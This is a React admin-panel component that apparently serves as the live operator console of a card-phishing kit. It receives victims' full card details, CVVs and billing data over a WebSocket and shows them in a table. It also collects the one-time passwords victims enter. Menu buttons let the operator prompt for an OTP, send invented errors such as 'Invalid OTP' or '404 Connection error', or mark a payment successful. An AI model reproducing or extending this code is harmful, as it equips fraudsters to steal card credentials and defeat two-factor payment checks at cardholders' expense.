import React, { useState, useEffect } from 'react';
import { MoreHorizontal, Check, X, AlertTriangle, Wifi, WifiOff } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { io, Socket } from 'socket.io-client';

interface PaymentData {
  id: string;
  cardNumber: string;
  cardName: string;
  cvv: string;
  expiry: string;
  billingDetails: {
    firstName: string;
    lastName: string;
    email: string;
    country: string;
    companyName: string;
  };
  planName: string;
  billing: string;
  amount: number;
  timestamp: string;
  status: 'pending' | 'approved' | 'rejected';
}

interface OtpData {
  paymentId: string;
  otp: string;
  timestamp: string;
}

const Admin = () => {
  const [socket, setSocket] = useState<Socket | null>(null);
  const [isConnected, setIsConnected] = useState(false);
  const [payments, setPayments] = useState<PaymentData[]>([]);
  const [otps, setOtps] = useState<OtpData[]>([]);
  const [activeDropdown, setActiveDropdown] = useState<string | null>(null);

  useEffect(() => {
    // Connect to WebSocket server
    const newSocket = io('ws://localhost:3001'); // Replace with your socket server
    setSocket(newSocket);

    newSocket.on('connect', () => {
      setIsConnected(true);
      console.log('Connected to WebSocket server');
    });

    newSocket.on('disconnect', () => {
      setIsConnected(false);
      console.log('Disconnected from WebSocket server');
    });

    // Listen for new payment data
    newSocket.on('payment-data', (data: Omit<PaymentData, 'id' | 'status'>) => {
      const newPayment: PaymentData = {
        ...data,
        id: Date.now().toString(),
        status: 'pending'
      };
      setPayments(prev => [newPayment, ...prev]);
    });

    // Listen for OTP submissions
    newSocket.on('otp-submitted', (data: { otp: string }) => {
      const latestPayment = payments[0];
      if (latestPayment) {
        const newOtp: OtpData = {
          paymentId: latestPayment.id,
          otp: data.otp,
          timestamp: new Date().toISOString()
        };
        setOtps(prev => [newOtp, ...prev]);
      }
    });

    return () => {
      newSocket.disconnect();
    };
  }, [payments]);

  const handleAction = (paymentId: string, action: string) => {
    if (!socket) return;

    switch (action) {
      case 'show-otp':
        socket.emit('show-otp');
        break;
      case 'invalid-otp':
        socket.emit('payment-rejected', 'Invalid OTP');
        updatePaymentStatus(paymentId, 'rejected');
        break;
      case 'invalid-card':
        socket.emit('payment-rejected', 'Invalid card details');
        updatePaymentStatus(paymentId, 'rejected');
        break;
      case 'incorrect-details':
        socket.emit('payment-rejected', 'Incorrect card details');
        updatePaymentStatus(paymentId, 'rejected');
        break;
      case 'connection-error':
        socket.emit('payment-rejected', '404 Connection error');
        updatePaymentStatus(paymentId, 'rejected');
        break;
      case 'successful':
        socket.emit('payment-approved');
        updatePaymentStatus(paymentId, 'approved');
        break;
    }
    setActiveDropdown(null);
  };

  const updatePaymentStatus = (paymentId: string, status: 'approved' | 'rejected') => {
    setPayments(prev => prev.map(payment => 
      payment.id === paymentId ? { ...payment, status } : payment
    ));
  };

  const formatCardNumber = (cardNumber: string) => {
    return `**** **** **** ${cardNumber.slice(-4)}`;
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'approved': return 'text-green-400';
      case 'rejected': return 'text-red-400';
      default: return 'text-yellow-400';
    }
  };

  const getStatusIcon = (status: string) => {
    switch (status) {
      case 'approved': return <Check className="h-4 w-4" />;
      case 'rejected': return <X className="h-4 w-4" />;
      default: return <AlertTriangle className="h-4 w-4" />;
    }
  };

  return (
    <div className="min-h-screen bg-black text-white p-6">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="flex items-center justify-between mb-8">
          <h1 className="text-3xl font-bold">Admin Panel</h1>
          <div className="flex items-center gap-2">
            {isConnected ? (
              <>
                <Wifi className="h-5 w-5 text-green-400" />
                <span className="text-green-400">Connected</span>
              </>
            ) : (
              <>
                <WifiOff className="h-5 w-5 text-red-400" />
                <span className="text-red-400">Disconnected</span>
              </>
            )}
          </div>
        </div>

        {/* Payment Data Table */}
        <div className="bg-gray-900 rounded-lg overflow-hidden mb-8">
          <div className="p-6 border-b border-gray-700">
            <h2 className="text-xl font-semibold">Payment Transactions</h2>
            <p className="text-gray-400 mt-1">Real-time payment data from checkout</p>
          </div>
          
          <div className="overflow-x-auto">
            <table className="w-full">
              <thead className="bg-gray-800">
                <tr>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Timestamp
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Customer
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Card Number
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Holder Name
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    CVV
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Expiry
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Amount
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Status
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Actions
                  </th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-700">
                {payments.length === 0 ? (
                  <tr>
                    <td colSpan={9} className="px-6 py-8 text-center text-gray-400">
                      No payment data received yet. Waiting for transactions...
                    </td>
                  </tr>
                ) : (
                  payments.map((payment) => (
                    <tr key={payment.id} className="hover:bg-gray-800">
                      <td className="px-6 py-4 whitespace-nowrap text-sm">
                        {new Date(payment.timestamp).toLocaleString()}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="text-sm font-medium">{payment.billingDetails.firstName} {payment.billingDetails.lastName}</div>
                        <div className="text-sm text-gray-400">{payment.billingDetails.email}</div>
                        <div className="text-xs text-gray-500">{payment.billingDetails.country}</div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm font-mono">
                        {formatCardNumber(payment.cardNumber)}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm">
                        {payment.cardName}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm font-mono">
                        {payment.cvv}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm">
                        {payment.expiry}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm font-medium">
                        ₹{payment.amount.toLocaleString()}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <span className={`flex items-center gap-2 text-sm font-medium ${getStatusColor(payment.status)}`}>
                          {getStatusIcon(payment.status)}
                          {payment.status.charAt(0).toUpperCase() + payment.status.slice(1)}
                        </span>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-right text-sm font-medium">
                        <div className="relative">
                          <Button
                            variant="ghost"
                            size="sm"
                            onClick={() => setActiveDropdown(activeDropdown === payment.id ? null : payment.id)}
                            className="text-white hover:bg-gray-700"
                          >
                            <MoreHorizontal className="h-4 w-4" />
                          </Button>
                          
                          {activeDropdown === payment.id && (
                            <div className="absolute right-0 mt-2 w-48 bg-gray-800 rounded-md shadow-lg z-10 border border-gray-700">
                              <div className="py-1">
                                <button
                                  onClick={() => handleAction(payment.id, 'show-otp')}
                                  className="block w-full text-left px-4 py-2 text-sm text-white hover:bg-gray-700"
                                >
                                  Show OTP
                                </button>
                                <button
                                  onClick={() => handleAction(payment.id, 'invalid-otp')}
                                  className="block w-full text-left px-4 py-2 text-sm text-white hover:bg-gray-700"
                                >
                                  Invalid OTP
                                </button>
                                <button
                                  onClick={() => handleAction(payment.id, 'invalid-card')}
                                  className="block w-full text-left px-4 py-2 text-sm text-white hover:bg-gray-700"
                                >
                                  Invalid Card
                                </button>
                                <button
                                  onClick={() => handleAction(payment.id, 'incorrect-details')}
                                  className="block w-full text-left px-4 py-2 text-sm text-white hover:bg-gray-700"
                                >
                                  Incorrect Card Details
                                </button>
                                <button
                                  onClick={() => handleAction(payment.id, 'connection-error')}
                                  className="block w-full text-left px-4 py-2 text-sm text-white hover:bg-gray-700"
                                >
                                  404 Connection Error
                                </button>
                                <button
                                  onClick={() => handleAction(payment.id, 'successful')}
                                  className="block w-full text-left px-4 py-2 text-sm text-green-400 hover:bg-gray-700"
                                >
                                  Successful
                                </button>
                              </div>
                            </div>
                          )}
                        </div>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>

        {/* OTP Data Table */}
        {otps.length > 0 && (
          <div className="bg-gray-900 rounded-lg overflow-hidden">
            <div className="p-6 border-b border-gray-700">
              <h2 className="text-xl font-semibold">OTP Submissions</h2>
              <p className="text-gray-400 mt-1">OTPs received from customers</p>
            </div>
            
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-800">
                  <tr>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                      Timestamp
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                      Payment ID
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                      OTP
                    </th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-700">
                  {otps.map((otp, index) => (
                    <tr key={index} className="hover:bg-gray-800">
                      <td className="px-6 py-4 whitespace-nowrap text-sm">
                        {new Date(otp.timestamp).toLocaleString()}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm font-mono">
                        {otp.paymentId}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm font-mono text-yellow-400">
                        {otp.otp}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default Admin;